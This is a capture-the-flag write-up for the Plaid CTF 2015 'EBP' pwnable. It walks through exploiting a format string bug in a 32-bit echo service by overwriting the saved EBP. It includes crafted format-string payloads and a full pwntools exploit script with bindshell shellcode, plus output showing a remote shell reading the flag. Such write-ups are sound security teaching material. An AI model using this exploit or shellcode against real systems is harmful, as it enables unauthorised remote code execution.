# Plaid CTF 2015: Strength

**Category:** EBP
**Points:** 160
**Description:** 

>Pwnable (160 pts)
>nc 52.6.64.173 4545 
>
>Download: [%p%o%o%p](challenge/ebp.elf).

## Write-up

We start by first checking the binary:

>```bash
>$ file ebp
>ebp: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xf994804ecd68699809b56d85dbba1038de9f74b0, not stripped
>```

A stripped 32-bit ELF binary. Let's see what checksec has to say:

>```bash
>gdb-peda$ checksec
>CANARY    : disabled
>FORTIFY   : disabled
>NX        : disabled
>PIE       : disabled
>RELRO     : Partial
>```

Ok, no protections to worry about. Let's load EBP into IDA and decompile it:

>```c
>int __cdecl main(int argc, const char **argv, const char **envp)
>{
>  int result; // eax@3
>
>  while ( 1 )
>  {
>    result = (int)fgets(buf, 1024, stdin);
>    if ( !result )
>      break;
>    echo();
>  }
>  return result;
>}
>
>int echo()
>{
>  make_response();
>  puts(response);
>  return fflush(stdout);
>}
>
>int make_response()
>{
>  return snprintf(response, 0x400u, buf);
>}
>```

We can spot a very straight-forward format string bug in make_response (where we control the format specifier in buf). Let's first try to dump the stack with it:

>%x.%x.%x.%x.%x.
>b76147a0.b7754ff4.0.bfa14cb8.804852c

Given that buf is a variable stored in the .bss section, no matter how far into the stack we dig, we won't encounter our own buffer so we won't get the usual write-anything/anywhere situation. But if we look at our stack dump we can see that the 5th DWORD on the stack is the return address from the call to make_response, indicating the 4th DWORD is the old EBP value. If we can overwrite the old EBP value we know that at the function epilogue handling it will do the following:

>```asm
>leave
>retn
>```

Which allows us to effectively:

>```asm
>mov eip, [old_ebp+4]
>```

So let's say we want to overwrite old EBP with 0x41414141:

>(364931861*2+364931860 + 3) = 0x41414141

We craft the following format string:

>%364931861x.%364931861x.%364931860x.%n

So if we can point old_ebp to 4 bytes before an address holding the address we want to overwrite eip with we hijack control flow. Given that our buf is located in the static .bss section at 0x0804A080 we can overwrite old_ebp with (0x0804A080-4) = 0x0804A07C and use the following string:

>AAAA%44840317x%44840317x%44840318x%n

To overwrite EIP with 0x41414141. Now for the final part we need to put our shellcode in our buffer and overwrite EIP with the address of our shellcode:

>eip_overwrite = (0x0804A080 + n)
>where n is the length of the FMS exploit (36 bytes)
>so eip_overwrite = 0x0804A0A4
>fms exploit: \xA4\xA0\x04\x08%44840317x%44840317x%44840318x%n<shellcode>

Note that we will need to keep our original socket open in order to prevent xinetd (which is running the challenge) from killing the exploited process.

The following dirty [little exploit](solution/ebp_sploit.py) will do the trick:

>```python
>#!/usr/bin/python
>#
># Plaid CTF 2015
># EBP (PWN/160)
>#
># @a: Smoke Leet Everyday
># @u: https://github.com/smokeleeteveryday
>#
>
>from pwn import *
>
>#
># Linux bindshell port 4444
>#
>buf =  ""
>buf += "\x31\xdb\xf7\xe3\x53\x43\x53\x6a\x02\x89\xe1\xb0\x66"
>buf += "\xcd\x80\x5b\x5e\x52\x68\x02\x00\x11\x5c\x6a\x10\x51"
>buf += "\x50\x89\xe1\x6a\x66\x58\xcd\x80\x89\x41\x04\xb3\x04"
>buf += "\xb0\x66\xcd\x80\x43\xb0\x66\xcd\x80\x93\x59\x6a\x3f"
>buf += "\x58\xcd\x80\x49\x79\xf8\x68\x2f\x2f\x73\x68\x68\x2f"
>buf += "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
>
>host = '52.6.64.173'
>#host = '127.0.0.1'
>port = 4545
>
>h = remote(host, port, timeout = None)
>
>print "[*]Sending exploit..."
>exploit = "\xA4\xA0\x04\x08%44840317x%44840317x%44840318x%n" + buf
>h.send(exploit + "\n")
>print "[+]Exploit sent!"
>msg = h.recv(1024)
>print msg
>
>h.close()
>```

Running it gives us:

>```bash
>$ python ebp_sploit.py
+] Opening connection to 52.6.64.173 on port 4545: Done
[*]Sending exploit...
> $ nc 52.6.64.173 4444
> id
> uid=1001(problem) gid=1001(problem) groups=1001(problem)
> ls /home/problem
> ebp
> flag.txt
> cat /home/problem/flag.txt
> who_needs_stack_control_anyway?
>```